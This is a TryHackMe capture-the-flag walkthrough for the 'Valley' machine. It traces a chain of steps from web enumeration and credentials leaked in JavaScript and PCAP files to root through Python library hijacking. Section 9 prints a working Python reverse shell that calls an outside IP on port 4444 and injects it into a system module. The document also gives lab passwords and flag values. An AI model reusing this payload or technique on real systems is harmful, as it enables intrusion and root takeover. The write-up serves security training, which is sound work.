# TryHackMe — Valley Walkthrough

**Difficulty:** Medium  
**OS:** Linux (Ubuntu 20.04)  
**Techniques:** Directory Enumeration, Hardcoded Credentials in JavaScript, PCAP Analysis, FTP, Binary Analysis (UPX + strings), MD5 Hash Cracking, Python Library Hijacking via Cron

---

## Table of Contents
1. [Reconnaissance](#1-reconnaissance)
2. [Web Enumeration](#2-web-enumeration)
3. [Hidden Dev Notes — Username & Secret Path](#3-hidden-dev-notes--username--secret-path)
4. [Hardcoded Credentials in JavaScript](#4-hardcoded-credentials-in-javascript)
5. [FTP Access & PCAP Analysis](#5-ftp-access--pcap-analysis)
6. [Initial Access — SSH as valleyDev](#6-initial-access--ssh-as-valleydev)
7. [Binary Reverse Engineering — valleyAuthenticator](#7-binary-reverse-engineering--valleyauthenticator)
8. [Lateral Movement — SSH as valley](#8-lateral-movement--ssh-as-valley)
9. [Privilege Escalation — Python Library Hijacking via Cron](#9-privilege-escalation--python-library-hijacking-via-cron)
10. [Flags](#10-flags)

---

## 1. Reconnaissance

Added the target to `/etc/hosts`:

```bash
echo "10.67.144.141  valley.thm" | sudo tee -a /etc/hosts
```

Initial nmap scan:

```bash
nmap -v -sC -sV -oN ./nmap/initial valley.thm
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp open  http    Apache httpd 2.4.41
```

Only two ports visible initially. The note in the dev file later mentioned a changed FTP port — ran a full port scan to find it:

```bash
nmap -p- -sV -T4 -oN nmap/findFTP.txt valley.thm
```

**Additional port found:**

```
37370/tcp open  ftp     vsftpd 3.0.3
```

> **Lesson:** Always run a full `-p-` scan alongside the default scan. Services on non-standard ports are a common CTF technique that mirrors real-world security through obscurity.

---

## 2. Web Enumeration

Ran directory enumeration with gobuster:

```bash
gobuster dir -u http://valley.thm \
             -w /usr/share/seclists/Discovery/Web-Content/common.txt \
             -t 50
```

**Results:**

```
/gallery   (Status: 301)
/pricing   (Status: 301)
/static    (Status: 301)
```

Then enumerated the `/static` directory, which appeared to serve numbered files:

```bash
ffuf -u 'http://valley.thm/static/FUZZ' \
     -w /usr/share/seclists/Discovery/Web-Content/big.txt \
     -mc all -t 100 -fw 23
```

**Results:** Files numbered 1–18 (images), plus an anomalous entry:

```
00  (Status: 200, Size: 127)
```

---

## 3. Hidden Dev Notes — Username & Secret Path

`http://valley.thm/static/00` returned a plaintext developer note:

```
dev notes from valleyDev:
-add wedding photo examples
-redo the editing on #4
-remove /dev1243224123123
-check for SIEM alerts
```

Two findings extracted:
- **Username:** `valleyDev`
- **Hidden path:** `/dev1243224123123`

Navigating to `http://valley.thm/dev1243224123123/` revealed a login page that sent no HTTP requests on submission — authentication was handled entirely client-side in JavaScript.

---

## 4. Hardcoded Credentials in JavaScript

Inspecting the page source revealed a linked script at:

```
http://valley.thm/dev1243224123123/dev.js
```

The login handler contained hardcoded credentials:

```javascript
loginButton.addEventListener("click", (e) => {
    e.preventDefault();
    const username = loginForm.username.value;
    const password = loginForm.password.value;
    if (username === "siemDev" && password === "california") {
        window.location.href = "/dev1243224123123/devNotes37370.txt";
    }
})
```

**Credentials found:** `siemDev` / `california`

> **How it works:** Client-side authentication is never secure. The credentials and the redirect URL are fully visible to anyone who reads the JavaScript source. This is a common mistake in hastily built internal tools.

Logging in redirected to `devNotes37370.txt`:

```
dev notes for ftp server:
-stop reusing credentials
-check for any vulnerabilities
-stay up to date on patching
-change ftp port to normal port
```

The note mentioned changing the FTP port (the `37370` in the filename was the hint) and, ironically, warned about credential reuse.

---

## 5. FTP Access & PCAP Analysis

Used the discovered credentials to access FTP on port 37370:

```bash
ftp -p valley.thm 37370
# Username: siemDev
# Password: california
```

Downloaded all files:

```
siemFTP.pcapng
siemHTTP1.pcapng
siemHTTP2.pcapng
```

Opened `siemHTTP2.pcapng` in Wireshark and filtered for POST requests. Found a login form submission in frame 2335 transmitted in cleartext over HTTP:

```
Form item: "uname" = "valleyDev"
Form item: "psw"   = "ph0t0s1234"
Form item: "remember" = "on"
```

**Credentials found:** `valleyDev` / `ph0t0s1234`

> **Why this works:** HTTP transmits data in plaintext. Any POST request containing form data (login credentials, sensitive input) is fully readable in a packet capture. HTTPS encrypts this data in transit — HTTP does not.

---

## 6. Initial Access — SSH as valleyDev

```bash
ssh valleyDev@valley.thm
# password: ph0t0s1234
```

```bash
cat ~/user.txt
# THM{k@l1_1n_th3_v@lley}
```

Checked `/home` for other users and found an interesting binary:

```bash
ls -la /home
# -rwxrwxr-x  1 valley  valley  749128  valleyAuthenticator
```

Transferred it to Kali for analysis:

```bash
# On target
python3 -m http.server 9999

# On Kali
wget http://valley.thm:9999/valleyAuthenticator
```

---

## 7. Binary Reverse Engineering — valleyAuthenticator

Initial `strings` output showed very little — a sign of packing. The first bytes revealed:

```bash
strings valleyAuthenticator | head
# UPX!
```

**UPX** (Ultimate Packer for eXecutables) is a common binary packer that compresses executables. Unpacked it:

```bash
upx -d valleyAuthenticator
```

Re-ran strings and searched for password-related content:

```bash
strings valleyAuthenticator | less
# /password
```

Found two MD5 hashes embedded before the authentication strings:

```
e6722920bab2326f8217e4bf6b1b58ac
dd2921cc76ee3abfd2beb60709056cfb
Welcome to Valley Inc. Authenticator
What is your username:
What is your password:
```

Cracked both hashes on [CrackStation](https://crackstation.net):

| Hash | Type | Plaintext |
|------|------|-----------|
| `e6722920bab2326f8217e4bf6b1b58ac` | MD5 | `liberty123` |
| `dd2921cc76ee3abfd2beb60709056cfb` | MD5 | `valley` |

> **Why MD5 is insecure:** MD5 is a fast hashing algorithm not designed for password storage. Its speed makes it trivial to brute force — modern GPUs can compute billions of MD5 hashes per second. Password storage should use slow algorithms like bcrypt, scrypt, or Argon2.

---

## 8. Lateral Movement — SSH as valley

```bash
ssh valley@valley.thm
# password: valley
```

Checked sudo privileges — none available. Inspected the system crontab:

```bash
cat /etc/crontab
# 1  *  *  *  *  root  python3 /photos/script/photosEncrypt.py
```

A Python script runs **every minute as root**.

---

## 9. Privilege Escalation — Python Library Hijacking via Cron

Examined the script:

```python
#!/usr/bin/python3
import base64

for i in range(1,7):
    image_path = "/photos/p" + str(i) + ".jpg"
    with open(image_path, "rb") as image_file:
        image_data = image_file.read()
    encoded_image_data = base64.b64encode(image_data)
    output_path = "/photos/photoVault/p" + str(i) + ".enc"
    with open(output_path, "wb") as output_file:
        output_file.write(encoded_image_data)
```

The script imports `base64`. Located the system library:

```bash
locate base64.py
# /usr/lib/python3.8/base64.py
```

Checked permissions:

```bash
ls -la /usr/lib/python3.8/base64.py
# -rw-rw-r--  (writable by group!)
```

The `valley` user had write access to the system `base64.py` library. Added a reverse shell payload at the top of the file:

```python
import os,socket,subprocess,threading

def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.132.14",4444))
p=subprocess.Popen(["sh"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()
p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()
try:
    p.wait()
except KeyboardInterrupt:
    s.close()
```

Started a listener and waited up to one minute for the cron job to fire:

```bash
nc -lnvp 4444
```

Root shell received:

```bash
whoami
# root

cat /root/root.txt
# THM{v@lley_0f_th3_sh@d0w_0f_pr1v3sc}
```

> **How Python library hijacking works:** When Python imports a module (e.g. `import base64`), it searches a list of directories in order (`sys.path`). If an attacker can write to any directory that appears before the real library location — or to the library file itself — their malicious code runs instead. Here, the system `base64.py` was group-writable, so any code prepended to it executes every time any Python script imports `base64`. Since the cron job runs as root and imports `base64`, our payload executes as root.

---

## 10. Flags

| Flag | Value |
|------|-------|
| User | `THM{k@l1_1n_th3_v@lley}` |
| Root | `THM{v@lley_0f_th3_sh@d0w_0f_pr1v3sc}` |

---

## Attack Chain Summary

```
nmap → ports 22, 80 (+ 37370 FTP on full scan)
        ↓
gobuster → /static directory
        ↓
/static/00 → dev note → hidden path /dev1243224123123 + username valleyDev
        ↓
/dev1243224123123/dev.js → hardcoded credentials siemDev:california
        ↓
devNotes37370.txt → FTP on port 37370 hint
        ↓
FTP (siemDev:california) → download PCAP files
        ↓
Wireshark → siemHTTP2.pcapng → POST credentials valleyDev:ph0t0s1234
        ↓
SSH as valleyDev → user flag
        ↓
/home/valleyAuthenticator → UPX packed binary
        ↓
upx -d → strings → MD5 hashes → CrackStation → valley:valley
        ↓
SSH as valley
        ↓
/etc/crontab → root runs photosEncrypt.py every minute
        ↓
photosEncrypt.py imports base64 → /usr/lib/python3.8/base64.py is group-writable
        ↓
Inject reverse shell into base64.py → cron fires → root shell
```

---

## Key Concepts

- **Client-side authentication:** Never implement authentication logic in JavaScript — credentials and logic are fully visible in the browser
- **PCAP analysis:** Network captures of unencrypted protocols (HTTP, FTP, Telnet) expose credentials in plaintext — always use HTTPS/SFTP/SSH
- **UPX unpacking:** Packed binaries hide strings from static analysis; `upx -d` restores the original binary for examination
- **MD5 for passwords:** MD5 is cryptographically broken for password storage — use bcrypt, Argon2, or scrypt
- **Python library hijacking:** If a Python library file is world/group-writable, any script that imports it will execute attacker-controlled code — file permissions on system libraries must be strictly controlled
- **Cron + writable dependencies:** A privileged cron job is only as secure as every file it depends on — scripts, libraries, and directories in the execution path all need proper permissions
